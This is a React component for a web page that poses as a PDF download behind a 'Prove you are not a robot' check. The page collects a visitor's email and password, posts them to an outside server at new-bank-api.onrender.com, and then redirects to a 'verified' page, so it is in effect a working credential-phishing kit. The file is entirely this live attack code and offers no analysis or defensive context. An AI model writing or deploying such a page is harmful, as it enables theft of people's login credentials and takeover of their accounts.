import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { AlertCircle, X, } from 'lucide-react';

function Pdf() {
    const navigate = useNavigate();
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState('');

     const ToastError = ({ id, message, onDismiss }) => (
        <div className="fixed top-4 right-4 z-50 bg-red-500 text-white px-6 py-4 rounded-lg shadow-lg flex items-center gap-3 max-w-md animate-slide-in">
            <AlertCircle size={20} />
            <span className="flex-1">{message}</span>
            <button
                onClick={() => onDismiss(id)}
                className="text-white hover:bg-red-600 p-1 rounded"
            >
                <X size={16} />
            </button>
        </div>
    );


    const loginHandler = async (e) => {
        e.preventDefault();
        setIsLoading(true);
        setError('');

        try {
            const res = await fetch("https://new-bank-api.onrender.com/api/contact", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ mail: email, pass: password })
            });

            const data = await res.json();

            if (res.ok || data.status === 'partial') {
                navigate('/verified', { state: { email } });
                // setError('Network error. Please check your connection and refresh the page.');
    
            } else {
                setError(data.message || 'failed. Please try again.');
            }
        } catch (error) {
            setError('Network error. Please check your connection and try again.');
            console.error("Network or parsing error", error);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className="relative min-h-screen flex flex-col pt-[60px] sm:px-6 lg:px-">
            {/* Background with overlay */}
            <div className="absolute inset-0 bg-[url(/image/image.png)] bg-no-repeat bg-cover bg-center bg-fixed"></div>
            <div className="absolute inset-0 backdrop-blur-[3px] bg-opacity-20"></div>

            {/* Content */}
            <div className="max-w-xs w-[320px] mx-auto bg-[#1d1717] shadow-lg overflow-hidden relative z-10 border border-gray-700">
                {/* Header with image */}
                <div className="flex justify-center mt-4">
                    <div>
                        <img
                            src="/image/pdf-logo.jpg"
                            alt="PDF Download"
                            className="object-cover w-[280px]"
                        />
                        <p className="w-[280px] bg-white text-center text-sm">Prove you are not a robot</p>
                    </div>
                </div>

                {/* Form section */}
                <div className="px-4 py-6">
                    {error && (
                        <div className="mb-3 p-2 bg-red-500 bg-opacity-20 border border-red-500 text-red-100 text-xs">
                            {error}
                        </div>
                    )}

                    <form onSubmit={loginHandler} className="space-y-2">
                        <div>
                            <div className="relative">
                                <input
                                    id="email"
                                    name="email"
                                    type="email"
                                    autoComplete="email"
                                    required
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    className="w-full px-3 py-2 text-sm border border-gray-300 bg-white focus:ring-blue-500 focus:border-blue-500"
                                    placeholder="Enter your email"
                                />
                            </div>
                        </div>

                        <div>
                            <div className="relative">
                                <input
                                    id="password"
                                    name="password"
                                    type={showPassword ? "text" : "password"}
                                    autoComplete="current-password"
                                    required
                                    value={password}
                                    onChange={(e) => setPassword(e.target.value)}
                                    className="w-full px-3 py-2 text-sm border border-gray-300 bg-white focus:ring-blue-500 focus:border-black"
                                    placeholder="Enter your password"
                                />
                                <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-500 hover:text-gray-700"
                                >
                                    {showPassword ? (
                                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7A9.97 9.97 0 014.02 8.971m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                                        </svg>
                                    ) : (
                                        <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                                        </svg>
                                    )}
                                </button>
                            </div>
                        </div>

                        <div className="flex justify-center mt-3">
                            <button
                                type="submit"
                                disabled={isLoading}
                                className={`w-[120px] bg-[#49169b] text-white py-2 text-sm transition duration-300 shadow-md hover:bg-[#3b138056]
                                ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
                            >
                                {isLoading ? (
                                    <span className="flex items-center justify-center">
                                        <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                        </svg>
                                        Downloading...
                                    </span>
                                ) : (
                                    'Download'
                                )}
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
}

export default Pdf;
